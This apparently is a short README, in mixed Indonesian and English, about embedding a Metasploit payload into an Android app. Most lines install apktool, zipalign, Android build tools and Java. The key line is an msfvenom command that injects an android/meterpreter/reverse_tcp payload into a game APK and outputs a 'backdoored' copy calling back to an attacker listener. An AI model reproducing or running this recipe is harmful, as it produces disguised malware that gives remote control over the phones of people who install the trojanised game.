# Metasploit-remote-desktop
MSF: Embed MSF exploit dengan msfvenom
```html
install 
apt-get install zipalign apktool
```
```html
apt-get install google-android-build-tools-installer zipalign
```
```html

pilih situs https://dl.google.com/ untuk download
```

jika install google-android-build-tools-installer gagal, coba


You can get a list of actual held packages with:
```html
dpkg --get-selections | grep hold
```

Another method of troubleshooting may be to use aptitude rather than apt-get to try to install your package:
```html

sudo aptitude install google-android-build-tools-installer
```

msfvenom -x PongGame.apk -p android/meterpreter/reverse_tcp LHOST=192.168.100.2 LPORT=4895 -o PongGame_backdoored.apk

if need install jasigner
```html
apt install openjdk-11-jdk
```
```html
update-alternative --config java
```

pilih 1 

